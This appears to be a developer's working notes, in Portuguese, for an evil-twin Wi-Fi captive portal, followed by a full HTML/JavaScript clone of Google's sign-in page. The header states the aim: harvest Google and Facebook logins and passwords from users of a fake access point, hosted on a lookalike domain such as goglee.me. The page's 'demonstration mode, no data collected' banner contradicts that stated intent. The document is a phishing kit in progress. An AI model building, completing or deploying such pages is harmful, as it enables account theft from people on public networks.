# PARA O CAPTIVE PORTAL -> PARA O FAKE AP USAR UM HTML QUE SEJA ASSIM, SEMELHANTEMENTE AO LOGIN (MOBILE) DA CONTA GOOGLE
- ADICIONAR UM BOTÃO DE: (ENTRAR COM GOOGLE) E ABAIXO OUTRO: (ENTRAR COM FACEBOOK)
- AO CLICAR NELES, CAPTURA LOGIN E SENHA!
- CAPTIVE PORTAL 2.0!
- URL DO CAPTIVE PORTAL DEVE SER ALGO BEM MASCARADO, SE POSSÍVEL USAR ALGO COMO: https://goglee.me/
-----------------------------------------------------------------------------------------------------------------------
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fazer login - Contas do Google</title>
  <!-- Tailwind CSS para estilização moderna e rápida -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Fonte Roboto (padrão do Google/Android) -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f0f4f9;
      -webkit-tap-highlight-color: transparent;
      color: #1f1f1f;
    }

    /* Estilo de tela cheia no mobile para simular o comportamento oficial */
    @media (max-width: 601px) {
      body {
        background-color: #ffffff;
      }
    }
    
    /* Input Flutuante Material Design 3 (Estilo Oficial Google V3) */
    .material-input-container {
      position: relative;
    }
    
    .material-input {
      border: 1px solid #747775;
      background-color: transparent;
      transition: border-color 0.15s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.15s cubic-bezier(0.4, 0, 0.2, 1);
    }
    
    .material-input:focus {
      border-color: #0b57d0;
      border-width: 2px;
      outline: none;
    }
    
    .material-label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      background-color: #ffffff;
      padding: 0 6px;
      color: #444746;
      transition: 0.15s cubic-bezier(0.4, 0, 0.2, 1) all;
      pointer-events: none;
      transform-origin: left top;
    }
    
    /* Efeito de flutuar quando focado ou preenchido */
    .material-input:focus ~ .material-label,
    .material-input:not(:placeholder-shown) ~ .material-label {
      top: 0;
      transform: translateY(-50%) scale(0.75);
      color: #0b57d0;
    }

    .material-input:not(:focus):not(:placeholder-shown) ~ .material-label {
      color: #444746;
    }

    /* Estilização da Barra de Progresso Infinita do Google (Loading) */
    .google-loader {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background-color: #e8f0fe;
      overflow: hidden;
      display: none;
    }

    .google-loader-bar {
      width: 100%;
      height: 100%;
      background-color: #0b57d0;
      animation: googleIndeterminate 1.2s infinite linear;
      transform-origin: 0% 50%;
    }

    @keyframes googleIndeterminate {
      0% { transform: translateX(0) scaleX(0); }
      40% { transform: translateX(0) scaleX(0.4); }
      100% { transform: translateX(100%) scaleX(0.6); }
    }

    /* Container de transição deslizante das telas */
    .step-container {
      display: flex;
      width: 400%;
      transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
    }
    
    .step-pane {
      width: 25%;
      flex-shrink: 0;
    }
  </style>
</head>
<body class="min-h-screen flex flex-col justify-between">

  <!-- Banner Informativo de Segurança (Demonstrativo UI/UX) -->
  <div class="bg-amber-50 border-b border-amber-200 text-amber-800 text-xs py-2 px-4 text-center font-medium flex items-center justify-center gap-2 z-50">
    <svg class="w-4 h-4 text-amber-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
    </svg>
    <span><strong>Modo de Demonstração:</strong> Esta é uma réplica da nova interface (V3) do Google para estudos. Nenhum dado é coletado.</span>
  </div>

  <!-- Container de Autenticação Centralizado -->
  <main class="flex-grow flex items-center justify-center p-0 sm:p-4">
    
    <!-- Card Principal (Padrão Google GLIF V3) -->
    <div class="relative w-full max-w-[1040px] min-h-[100vh] sm:min-h-[440px] md:min-h-[500px] bg-white sm:rounded-[28px] p-6 sm:p-9 md:p-10 sm:border sm:border-[#e3e3e3] overflow-hidden flex flex-col justify-between">
      
      <!-- Linha de Carregamento Superior -->
      <div id="loading-bar" class="google-loader sm:rounded-t-[28px]">
        <div class="google-loader-bar"></div>
      </div>

      <!-- Layout Responsivo de Duas Colunas (Split-Screen) -->
      <div class="flex flex-col md:flex-row flex-grow justify-between gap-6 md:gap-10">
        
        <!-- Coluna Esquerda: Marca e Cabeçalhos Dinâmicos -->
        <div class="md:w-[45%] flex flex-col justify-start pt-2 md:pt-4">
          <!-- Logo do Google Oficial -->
          <div class="mb-5 md:mb-6">
            <svg class="h-8" viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M9.25 18.2C4.21 18.2 0 14.1 0 9.1C0 4.1 4.2 0 9.25 0C12.04 0 14.02 1.1 15.53 2.5L13.77 4.3C12.7 3.3 11.27 2.5 9.25 2.5C5.58 2.5 2.7 5.5 2.7 9.1C2.7 12.7 5.58 15.7 9.25 15.7C11.63 15.7 13.01 14.7 13.87 13.8C14.58 13.1 15.04 12.1 15.22 10.7H9.25V8.2H17.65C17.74 8.7 17.79 9.2 17.79 9.8C17.79 11.7 17.29 14 15.64 15.6C14.02 17.3 11.98 18.2 9.25 18.2Z" fill="#4285F4"/>
              <path d="M25.33 12.3V2.4H22.75V12.3H25.33Z" fill="#34A853"/>
              <path d="M33.43 12.5C30.63 12.5 28.32 10.3 28.32 7.4C28.32 4.5 30.63 2.3 33.43 2.3C36.23 2.3 38.54 4.5 38.54 7.4C38.54 10.3 36.23 12.5 33.43 12.5ZM33.43 4.7C31.81 4.7 30.91 6 30.91 7.4C30.91 8.8 31.81 10.1 33.43 10.1C35.05 10.1 35.95 8.8 35.95 7.4C35.95 6 35.05 4.7 33.43 4.7Z" fill="#EA4335"/>
              <path d="M45.54 12.5C42.74 12.5 40.43 10.3 40.43 7.4C40.43 4.5 42.74 2.3 45.54 2.3C48.34 2.3 50.65 4.5 50.65 7.4C50.65 10.3 48.34 12.5 45.54 12.5ZM45.54 4.7C43.92 4.7 43.02 6 43.02 7.4C43.02 8.8 43.92 10.1 45.54 10.1C47.16 10.1 48.06 8.8 48.06 7.4C48.06 6 47.16 4.7 45.54 4.7Z" fill="#FBBC05"/>
              <path d="M57.41 12.5C54.78 12.5 52.48 10.4 52.48 7.5C52.48 4.5 54.78 2.4 57.41 2.4C59.98 2.4 61.35 3.9 61.85 4.9L59.57 5.9C59.18 5.1 58.46 4.7 57.38 4.7C56.12 4.7 55.07 5.9 55.07 7.5C55.07 9.1 56.12 10.3 57.38 10.3C58.46 10.3 59.13 9.8 59.62 9.1L61.9 10.1C61.39 11 59.98 12.5 57.41 12.5Z" fill="#4285F4"/>
              <path d="M70.18 12.5C68.96 12.5 67.24 11.9 66.69 10.6L73.91 7.6L73.66 7C73.19 5.8 71.86 2.3 67.97 2.3C64.08 2.3 61.93 5.4 61.93 7.4C61.93 10.2 64.05 12.5 67.43 12.5C70.15 12.5 71.84 10.8 72.49 9.8L70.43 8.4C69.74 9.4 68.86 10.1 67.43 10.1C66.11 10.1 65.34 9.4 64.83 8.4L73.98 4.6L73.68 4L70.18 12.5Z" fill="#EA4335"/>
            </svg>
          </div>

          <!-- Título Dinâmico -->
          <h1 id="dynamic-title" class="text-[32px] font-normal text-[#1f1f1f] tracking-tight leading-tight mb-2">Fazer login</h1>
          <!-- Subtítulo Dinâmico -->
          <p id="dynamic-subtitle" class="text-[16px] text-[#1f1f1f] leading-normal font-normal">Use sua Conta do Google</p>

          <!-- Chip do Usuário Selecionado (Exibido apenas na etapa da senha) -->
          <div id="user-chip" class="hidden mt-4 self-start">
            <button onclick="voltarParaEmail()" class="flex items-center gap-2 border border-[#747775] hover:bg-gray-50 rounded-full pl-2 pr-3 py-1 text-sm text-[#1f1f1f] font-medium transition-all focus:outline-none">
              <!-- Ícone de usuário simplificado -->
              <div class="w-5 h-5 bg-[#e8f0fe] rounded-full flex items-center justify-center text-[#0b57d0]">
                <svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
              </div>
              <span id="user-display" class="max-w-[180px] truncate">usuario@gmail.com</span>
              <svg class="w-4 h-4 text-[#444746]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
              </svg>
            </button>
          </div>
        </div>
        
        <!-- Coluna Direita: Fluxos e Inputs Deslizantes -->
        <div class="md:w-[50%] flex flex-col justify-between overflow-hidden relative">
          <div class="overflow-hidden w-full h-full flex flex-col justify-between flex-grow">
            <div id="step-wrapper" class="step-container h-full">
              
              <!-- ETAPA 1: LOGIN (E-MAIL) -->
              <div class="step-pane flex flex-col justify-between h-full pr-1">
                <div class="pt-2 md:pt-4">
                  <!-- Input Outlined Material 3 -->
                  <div class="mb-2">
                    <div class="material-input-container">
                      <input type="text" id="email-input" placeholder=" " class="material-input w-full h-[56px] px-4 rounded-[4px] text-[16px] text-[#1f1f1f]" autocomplete="username">
                      <label class="material-label">E-mail ou telefone</label>
                    </div>
                    <!-- Erro E-mail -->
                    <p id="email-error" class="text-xs text-[#b3261e] mt-2 hidden flex items-center gap-1.5 font-normal">
                      <svg class="w-4 h-4 flex-shrink-0 text-[#b3261e]" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                      <span>Digite um e-mail ou número de telefone válido</span>
                    </p>
                  </div>

                  <!-- Esqueceu seu e-mail? -->
                  <button class="text-sm text-[#0b57d0] font-medium hover:text-[#0842a0] transition-colors focus:outline-none mb-6">
                    Esqueceu seu e-mail?
                  </button>

                  <!-- Informativo Navegação Anônima -->
                  <p class="text-sm text-[#444746] leading-relaxed mb-6 font-normal">
                    Não é seu computador? Use uma janela de navegação privada para fazer login.
                    <a href="#" class="text-[#0b57d0] font-medium hover:underline inline-block">Saiba mais sobre como usar o modo visitante</a>
                  </p>
                </div>

                <!-- Botões de Ação da Etapa 1 -->
                <div class="flex items-center justify-between pt-6 md:pt-4 mt-auto">
                  <button onclick="irParaCriarConta()" class="step-btn text-sm text-[#0b57d0] font-medium hover:bg-[#f3f6fc] hover:text-[#0842a0] px-4 py-2.5 rounded-full transition-all focus:outline-none focus:bg-[#f3f6fc]">
                    Criar conta
                  </button>
                  <button onclick="validaEmail()" class="step-btn bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-all shadow-sm focus:ring-2 focus:ring-offset-2 focus:ring-[#0b57d0] focus:outline-none">
                    Próxima
                  </button>
                </div>
              </div>

              <!-- ETAPA 2: DIGITAR SENHA -->
              <div class="step-pane flex flex-col justify-between h-full px-1">
                <div class="pt-2 md:pt-4">
                  <!-- Input Outlined Senha -->
                  <div class="mb-3">
                    <div class="material-input-container">
                      <input type="password" id="password-input" placeholder=" " class="material-input w-full h-[56px] px-4 rounded-[4px] text-[16px] text-[#1f1f1f]" autocomplete="current-password">
                      <label class="material-label">Digite sua senha</label>
                    </div>
                    <!-- Erro Senha -->
                    <p id="password-error" class="text-xs text-[#b3261e] mt-2 hidden flex items-center gap-1.5 font-normal">
                      <svg class="w-4 h-4 flex-shrink-0 text-[#b3261e]" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                      <span>Senha incorreta ou muito curta</span>
                    </p>
                  </div>

                  <!-- Checkbox Mostrar Senha -->
                  <div class="flex items-center gap-3 mb-6 select-none">
                    <input type="checkbox" id="show-password" onchange="toggleSenhaVisivel('password-input', this)" class="w-4 h-4 text-[#0b57d0] rounded border-[#747775] focus:ring-[#0b57d0] cursor-pointer">
                    <label for="show-password" class="text-sm text-[#1f1f1f] cursor-pointer font-normal">Mostrar senha</label>
                  </div>
                </div>

                <!-- Botões de Ação da Etapa 2 -->
                <div class="flex items-center justify-between pt-6 md:pt-4 mt-auto">
                  <button class="step-btn text-sm text-[#0b57d0] font-medium hover:bg-[#f3f6fc] hover:text-[#0842a0] px-4 py-2.5 rounded-full transition-all focus:outline-none">
                    Esqueceu a senha?
                  </button>
                  <button onclick="validaSenha()" class="step-btn bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-all shadow-sm focus:ring-2 focus:ring-offset-2 focus:ring-[#0b57d0] focus:outline-none">
                    Próxima
                  </button>
                </div>
              </div>

              <!-- ETAPA 3: CRIAR CONTA (FORMULÁRIO) -->
              <div class="step-pane flex flex-col justify-between h-full px-1">
                <div class="overflow-y-auto max-h-[380px] pr-1 pt-2 md:pt-4">
                  <!-- Nome e Sobrenome lado a lado -->
                  <div class="grid grid-cols-2 gap-3 mb-4">
                    <div class="material-input-container">
                      <input type="text" id="create-first-name" placeholder=" " class="material-input w-full h-[52px] px-3 rounded-[4px] text-[15px] text-[#1f1f1f]">
                      <label class="material-label">Nome</label>
                    </div>
                    <div class="material-input-container">
                      <input type="text" id="create-last-name" placeholder=" " class="material-input w-full h-[52px] px-3 rounded-[4px] text-[15px] text-[#1f1f1f]">
                      <label class="material-label">Sobrenome (opcional)</label>
                    </div>
                  </div>

                  <!-- Nome de Usuário desejado -->
                  <div class="mb-4">
                    <div class="flex items-center relative material-input-container">
                      <input type="text" id="create-username" placeholder=" " class="material-input w-full h-[52px] pl-3 pr-[100px] rounded-[4px] text-[15px] text-[#1f1f1f]">
                      <label class="material-label">Nome de usuário</label>
                      <span class="absolute right-3 text-sm text-[#444746] font-medium pointer-events-none">@gmail.com</span>
                    </div>
                  </div>

                  <!-- Criar Senha -->
                  <div class="mb-3">
                    <div class="material-input-container">
                      <input type="password" id="create-password" placeholder=" " class="material-input w-full h-[52px] px-3 rounded-[4px] text-[15px] text-[#1f1f1f]">
                      <label class="material-label">Crie uma senha</label>
                    </div>
                  </div>

                  <!-- Mostrar Senha Cadastro -->
                  <div class="flex items-center gap-2 mb-4 select-none">
                    <input type="checkbox" id="show-password-create" onchange="toggleSenhaVisivel('create-password', this)" class="w-4 h-4 text-[#0b57d0] rounded border-[#747775] focus:ring-[#0b57d0] cursor-pointer">
                    <label for="show-password-create" class="text-xs text-[#1f1f1f] cursor-pointer font-normal">Mostrar senha</label>
                  </div>

                  <!-- Erro de Cadastro -->
                  <p id="create-error" class="text-xs text-[#b3261e] hidden flex items-center gap-1 mb-2 font-normal">
                    <svg class="w-4 h-4 flex-shrink-0 text-[#b3261e]" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                    <span id="create-error-msg">Preencha todos os campos corretamente</span>
                  </p>
                </div>

                <!-- Botões de Ação do Cadastro -->
                <div class="flex items-center justify-between pt-6 md:pt-4 mt-auto">
                  <button onclick="voltarParaEmail(true)" class="step-btn text-sm text-[#0b57d0] font-medium hover:bg-[#f3f6fc] hover:text-[#0842a0] px-4 py-2.5 rounded-full transition-all focus:outline-none">
                    Fazer login
                  </button>
                  <button onclick="validaCadastro()" class="step-btn bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-all shadow-sm focus:ring-2 focus:ring-offset-2 focus:ring-[#0b57d0] focus:outline-none">
                    Próxima
                  </button>
                </div>
              </div>

              <!-- ETAPA 4: SUCESSO -->
              <div class="step-pane flex flex-col items-center justify-center text-center px-4 py-8 h-full">
                <!-- Ícone de Check Oficial do Google Admin -->
                <div class="w-16 h-16 bg-[#e6f4ea] rounded-full flex items-center justify-center mb-6">
                  <svg class="w-8 h-8 text-[#137333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                
                <h2 id="success-title" class="text-2xl font-normal text-[#1f1f1f] mb-2 tracking-tight">Prontinho!</h2>
                <p id="success-desc" class="text-sm text-[#444746] max-w-[280px] mb-8 leading-relaxed font-normal">Seu teste foi realizado de forma segura e responsiva.</p>
                
                <button onclick="voltarParaEmail(true)" class="border border-[#747775] text-[#1f1f1f] hover:bg-gray-50 text-sm font-medium px-6 py-2.5 rounded-full transition-all focus:outline-none">
                  Fazer login com outro e-mail
                </button>
              </div>

            </div>
          </div>
        </div>

      </div>

    </div>
  </main>

  <!-- Rodapé padrão Google -->
  <footer class="w-full max-w-[1040px] mx-auto px-6 sm:px-9 py-5 flex flex-col sm:flex-row justify-between items-center text-xs text-[#444746] gap-4 select-none">
    <div class="flex items-center gap-1.5 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e8f0fe] px-2.5 py-1.5 rounded transition-all">
      <span>Português (Brasil)</span>
      <svg class="w-3.5 h-3.5 text-[#444746]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
      </svg>
    </div>
    <div class="flex gap-6">
      <a href="#" class="hover:text-black hover:underline">Ajuda</a>
      <a href="#" class="hover:text-black hover:underline">Privacidade</a>
      <a href="#" class="hover:text-black hover:underline">Termos</a>
    </div>
  </footer>

  <!-- Script para controle interativo e simulação de estados -->
  <script>
    const wrapper = document.getElementById('step-wrapper');
    const loadingBar = document.getElementById('loading-bar');
    
    // Elementos de Títulos Dinâmicos (Coluna Esquerda)
    const dTitle = document.getElementById('dynamic-title');
    const dSubtitle = document.getElementById('dynamic-subtitle');
    const userChip = document.getElementById('user-chip');
    const userDisplay = document.getElementById('user-display');

    // Inputs Login
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');

    // Inputs Cadastro
    const createFirstName = document.getElementById('create-first-name');
    const createLastName = document.getElementById('create-last-name');
    const createUsername = document.getElementById('create-username');
    const createPassword = document.getElementById('create-password');
    const createError = document.getElementById('create-error');
    const createErrorMsg = document.getElementById('create-error-msg');

    // Elementos de Sucesso
    const successTitle = document.getElementById('success-title');
    const successDesc = document.getElementById('success-desc');

    // Simulação do carregamento assíncrono (Linear Progress Bar)
    function simulateLoading(callback) {
      loadingBar.style.display = 'block';
      const buttons = document.querySelectorAll('.step-btn');
      buttons.forEach(btn => btn.disabled = true);

      setTimeout(() => {
        loadingBar.style.display = 'none';
        buttons.forEach(btn => btn.disabled = false);
        callback();
      }, 1100);
    }

    // Etapa 1: Validação de E-mail
    function validaEmail() {
      const emailVal = emailInput.value.trim();
      
      if (emailVal === "" || emailVal.length < 3) {
        emailError.classList.remove('hidden');
        emailInput.classList.add('border-[#b3261e]', 'focus:border-[#b3261e]', 'focus:ring-[#b3261e]');
        return;
      }
      
      emailError.classList.add('hidden');
      emailInput.classList.remove('border-[#b3261e]', 'focus:border-[#b3261e]', 'focus:ring-[#b3261e]');
      
      simulateLoading(() => {
        // Altera para a conta inserida ou gera um padrão @gmail.com
        const formattedEmail = emailVal.includes('@') ? emailVal : `${emailVal}@gmail.com`;
        userDisplay.textContent = formattedEmail;
        
        // Ajusta títulos da coluna esquerda para a etapa da senha
        dTitle.textContent = "Olá";
        dSubtitle.classList.add('hidden');
        userChip.classList.remove('hidden');

        // Move container para o Painel de Senha (Etapa 2)
        wrapper.style.transform = 'translateX(-25%)';
        setTimeout(() => passwordInput.focus(), 200);
      });
    }

    // Etapa 2: Validação de Senha
    function validaSenha() {
      const passwordVal = passwordInput.value;
      
      if (passwordVal === "" || passwordVal.length < 4) {
        passwordError.classList.remove('hidden');
        passwordInput.classList.add('border-[#b3261e]', 'focus:border-[#b3261e]', 'focus:ring-[#b3261e]');
        return;
      }
      
      passwordError.classList.add('hidden');
      passwordInput.classList.remove('border-[#b3261e]', 'focus:border-[#b3261e]', 'focus:ring-[#b3261e]');
      
      simulateLoading(() => {
        // Ajusta cabeçalho da coluna esquerda para Sucesso
        dTitle.textContent = "Tudo pronto";
        dSubtitle.textContent = "Acesso autorizado com sucesso";
        dSubtitle.classList.remove('hidden');
        userChip.classList.add('hidden');

        successTitle.textContent = "Acesso Simulado!";
        successDesc.innerHTML = `Login efetuado com sucesso usando a conta:<br><strong class="text-[#0b57d0]">${userDisplay.textContent}</strong>`;
        
        // Move para o painel de sucesso (Etapa 4)
        wrapper.style.transform = 'translateX(-75%)';
      });
    }

    // Ir para tela de criação de conta (Etapa 3)
    function irParaCriarConta() {
      createFirstName.value = "";
      createLastName.value = "";
      createUsername.value = "";
      createPassword.value = "";
      createError.classList.add('hidden');

      simulateLoading(() => {
        dTitle.textContent = "Criar uma conta";
        dSubtitle.textContent = "Insira suas informações de simulação";
        userChip.classList.add('hidden');

        wrapper.style.transform = 'translateX(-50%)';
        setTimeout(() => createFirstName.focus(), 200);
      });
    }

    // Etapa 3: Validação do Cadastro
    function validaCadastro() {
      const fName = createFirstName.value.trim();
      const uName = createUsername.value.trim();
      const pwd = createPassword.value;

      if (!fName) {
        showCreateError("Digite seu primeiro nome");
        createFirstName.focus();
        return;
      }
      if (!uName || uName.length < 3) {
        showCreateError("Nome de usuário inválido");
        createUsername.focus();
        return;
      }
      if (!pwd || pwd.length < 4) {
        showCreateError("Crie uma senha de no mínimo 4 caracteres");
        createPassword.focus();
        return;
      }

      createError.classList.add('hidden');
      
      simulateLoading(() => {
        const fullUsername = uName.includes('@') ? uName : `${uName}@gmail.com`;
        
        dTitle.textContent = "Conta criada";
        dSubtitle.textContent = "Aproveite seu simulador";
        dSubtitle.classList.remove('hidden');
        userChip.classList.add('hidden');

        successTitle.textContent = `Seja bem-vindo, ${fName}!`;
        successDesc.innerHTML = `Sua conta demo foi criada com o endereço:<br><strong class="text-[#0b57d0]">${fullUsername}</strong>`;
        
        // Move para o painel de sucesso (Etapa 4)
        wrapper.style.transform = 'translateX(-75%)';
      });
    }

    function showCreateError(msg) {
      createErrorMsg.textContent = msg;
      createError.classList.remove('hidden');
    }

    // Retornar ao início (Etapa 1)
    function voltarParaEmail(reset = false) {
      if (reset) {
        emailInput.value = "";
        passwordInput.value = "";
        createFirstName.value = "";
        createLastName.value = "";
        createUsername.value = "";
        createPassword.value = "";
      }
      
      dTitle.textContent = "Fazer login";
      dSubtitle.textContent = "Use sua Conta do Google";
      dSubtitle.classList.remove('hidden');
      userChip.classList.add('hidden');

      wrapper.style.transform = 'translateX(0%)';
      setTimeout(() => emailInput.focus(), 200);
    }

    // Alternador de Visibilidade das Senhas
    function toggleSenhaVisivel(inputId, checkbox) {
      const target = document.getElementById(inputId);
      target.type = checkbox.checked ? "text" : "password";
    }

    // Atalhos de teclado (Enter para avançar de etapa)
    emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') validaEmail(); });
    passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') validaSenha(); });
    createPassword.addEventListener('keypress', (e) => { if (e.key === 'Enter') validaCadastro(); });
  </script>
</body>
</html>

---------------
usar assim, mas adaptar para ser multiplataforma: mobile e desktop!
